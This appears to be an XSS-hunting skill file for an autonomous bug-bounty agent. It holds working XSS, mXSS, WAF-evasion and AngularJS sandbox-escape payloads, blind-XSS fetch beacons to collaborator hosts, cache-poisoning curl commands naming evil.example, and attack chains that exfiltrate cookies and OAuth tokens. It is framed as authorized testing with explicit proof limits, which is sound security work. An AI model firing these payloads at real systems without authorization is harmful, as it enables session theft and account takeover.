---
name: hunt-xss
description: "Hunt XSS from 174 disclosed reports: reflected, stored and DOM contexts, Shadow DOM and declarative shadow roots as sink contexts, SOME callback abuse, XSSI, WebAssembly linear-memory XSS, and CSP bypass depth (strict-dynamic and script gadgets, nonce reuse and theft, base-uri omission, JSONP on allowlisted origins, bfcache nonce reuse). Raw HTML that does not execute script belongs to hunt-html-injection. Use when hunting XSS on any target."
metadata:
  sources: github, hackerone_public, mdn_web_docs, w3c_csp3_spec, chrome_developers, chromium_source, github_security_advisories, public_research, hacktricks_coverage_checklist
  report_count: 174
---

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

## References Index

| File | Coverage | Trigger phrases |
|---|---|---|
| `shadow-dom-and-modern-sinks.md` | Shadow DOM as a sink context: open versus closed roots, declarative shadow DOM browser support, why `innerHTML` is safe against it while `setHTMLUnsafe`/`parseHTMLUnsafe` are not, live-DOM sanitizer returns (`IN_PLACE`/`RETURN_DOM`), DOMPurify's documented closed-root limit, `attachShadow` hooking, the `slotchange` gadget; WASM linear-memory template overwrite and why source-to-sink analysis misses it, with read-only memory-recon helpers; the markdown-renderer delta (sanitize-then-render ordering, mXSS in the final DOM, `<base>` rewriting, CVE-2025-54075) | shadow DOM, shadow root, closed shadow root, declarative shadow DOM, shadowrootmode, setHTMLUnsafe, parseHTMLUnsafe, web component XSS, DOMPurify RETURN_DOM, slotchange, WebAssembly XSS, WASM linear memory, HEAPU8, Emscripten, template overwrite, markdown renderer XSS, mXSS |
| `callback-and-script-inclusion.md` | SOME (Same Origin Method Execution): the five-step opener chain, callback character restrictions, what COOP does to it, and a non-state-changing proof bar; XSSI: the 2015 dynamic-JavaScript measurement, the two gates (`SameSite`, Chrome CORB rules quoted exactly), live shapes (JS-typed per-user responses, JSONP, MIME confusion without `nosniff`), the dead pre-ES5 shapes, a two-tester-account probe; ownership table against `hunt-xs-leaks`, `hunt-cors` and `hunt-session` | SOME, same origin method execution, callback parameter, JSONP reflection, window.opener, COOP, XSSI, cross-site script inclusion, dynamic JavaScript leak, CORB, nosniff, content sniffing leak, JSON security prefix |
| `csp-bypass-depth.md` | `'strict-dynamic'` (host allowlist ignored, parser-inserted versus `createElement`, script gadgets, CSP1/2/3 compatibility trap) and Trusted Types as the kill; nonce reuse and nonce theft (nonce hiding, `<meta>` CSP leak, cached nonces, reflected nonces); `base-uri` omission with no `default-src` fallback; JSONP on allowlisted origins; Chrome disk-cache/bfcache-to-XSS including the `Cache-Control: no-store` bfcache change that invalidates older PoCs | strict-dynamic, script gadget, code reuse attack, CSP bypass, nonce reuse, nonce theft, nonce hiding, meta CSP, base-uri, base tag injection, JSONP allowlist, require-trusted-types-for, trusted types, bfcache, disk cache, notRestoredReasons, browser cache to XSS |

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.example` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.example/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.example/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.example/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.example/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.example"
curl -sk "https://target.example/page" | grep -i "evil.example"
```

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`
- **DOMPurify version gates** (read `DOMPurify.version` in the console or the bundle banner, then match):
  - `< 3.1.3`: public mXSS / namespace-confusion bypasses, fixed across 3.1.1 to 3.1.3 (Mizu, <https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes>).
  - `< 3.2.4`: CVE-2025-26791 (GHSA-vhxf-7vqr-mrjg), template-literal regex mXSS, only with `SAFE_FOR_TEMPLATES`.
  - `3.1.3` to `3.2.6` (fixed 3.2.7) and `2.5.3` to `2.5.8` (never patched): CVE-2025-15599 (GHSA-v8jm-5vwx-cfxm), `SAFE_FOR_XML` misses `textarea`, relevant when sanitized output lands inside a rawtext element.
  - `3.0.1` to `3.3.3` (fixed 3.4.0): CVE-2026-41238 (GHSA-v9jr-rg53-9pgp). With the default config a separate prototype-pollution bug can plant permissive custom-element checks, so pair it with `hunt-dom` / DOM Invader prototype-pollution findings (<https://labs.trace37.com/blog/dompurify-pp-ceh-bypass/>).
  - Latest fixed release on 2026-10-13 is 3.4.17; check the cure53/DOMPurify advisories for anything newer.
- **Unicode normalization:** if the app NFKC-normalizes after the filter runs, fullwidth `＜` (U+FF1C), `＞` (U+FF1E) and `＂` (U+FF02) fold to `<`, `>` and `"`. Send one fullwidth character first and check whether it comes back folded. Ref: Ryan & Isabella Barnett, "Lost in Translation: Exploiting Unicode Normalization" (PortSwigger Top 10 2025 #4).

**Filter Evasion:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.example/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
    - `PARAM` = the reflected parameter you found.
    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.example/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.example.attacker.example`).
- **B.** Attacker page opens `target.example` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.example` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Advanced Sinks, Callbacks & CSP Depth

Surfaces the sections above name but never open. The depth lives in `references/`, where every entry carries a **Status** line (what is verified, against which source, on which date), a **Killed by** line and a **Proof bar**. An entry with no Status line is unverified; do not report it as live.

- **Shadow DOM:** a sanitizer that walks the light DOM misses a shadow tree entirely, and `mode: "closed"` hides a root from `element.shadowRoot` but not from same-realm script. `innerHTML` never creates a declarative shadow root; `setHTMLUnsafe()` and `parseHTMLUnsafe()` do, which is what turns `<template shadowrootmode>` into a sink context. See `shadow-dom-and-modern-sinks.md`.
- **WebAssembly linear memory:** a writable HTML format template inside `WebAssembly.Memory` is overwritten so that correctly sanitized input lands in an event-handler position. Source-to-sink analysis misses it because the taint never touches a JS value. Same file.
- **SOME (Same Origin Method Execution):** the escalation for a `?callback=` reflection restricted to `[\w.]`, where a borrowed same-origin document reached through `window.opener` turns an apparently useless JSONP reflection into invocation of a real method. See `callback-and-script-inclusion.md`.
- **XSSI (cross-site script inclusion):** include a victim's authenticated JavaScript or JSONP response as a `<script>` and read the data it defines. Same file, which also sets the boundary against `hunt-xs-leaks`: that skill owns the load-versus-error oracle bit, this one owns reading the body.
- **CSP depth:** step 9 and the Bypass Techniques list stop at the names. `csp-bypass-depth.md` carries `'strict-dynamic'` semantics with its script-gadget failure mode, nonce reuse and what nonce hiding already killed, `base-uri` omission (it has no `default-src` fallback), JSONP on allowlisted origins, and Chrome's bfcache-to-disk-cache fallback as a nonce-reuse accelerator.

---

## Proof Discipline for Stored, Blind & Self-XSS

Extends the OOB gate and Gate 0 above, and governs every payload in this skill, including the exfiltration shapes sketched in Chains 3 and 5 and in the `hunt-csrf` cross-reference. Those describe what an attacker could do. What you run is narrower:

- **Never write a payload that exfiltrates real user data, posts content, or performs an action as another user.** Proof is execution in the tester's own browser, in the tester's own session. A payload that reads `document.cookie`, scrapes page content, or calls a state-changing endpoint on someone else's behalf is out of scope however good the PoC looks.
- **`alert(<CANARY>)` is a detection marker, not a finding.** It proves the context is executable; Gate 0 still has to be answered.
- **Stored XSS confirmed only in your own view is not yet cross-user.** Prove it reaches other users with a second account that is also the tester's: store from account A, log in as account B in a clean profile, and show the canary firing there. One account plus an assumption is the most common downgrade on this class.
- **Blind-XSS callbacks hit a collector you control**, and that collector must not log third-party data. The payload captures a canary only: a request to a per-sink subdomain is what proves execution. Do not append `document.cookie`, `document.domain`, `location.href` or page HTML to the beacon. `<svg onload=fetch('//bxss-<sink>.<collab>/x')>` is the whole payload.
- **Self-XSS is not a finding on its own** and sits on the repo's always-rejected list (`cbh/cli.py`, mirrored in `security-arsenal`). The exact extra condition for promotion: a demonstrated delivery path that plants the payload into the victim's stored state with no paste and no self-inflicted action by the victim. Chain 2's CSRF write of the field is one such path. Demonstrate that plant end to end between two tester-owned accounts; without it the report stays a non-finding.
- **Stored payloads persist after you leave.** Keep an inventory while you work: URL, field, canary value, timestamp. Delete each one, or hand the inventory to the target if deletion is not possible, and keep anything undeletable to an inert marker.

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.example` poisons a cached response whose `<script src=...>` now points at attacker.example → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
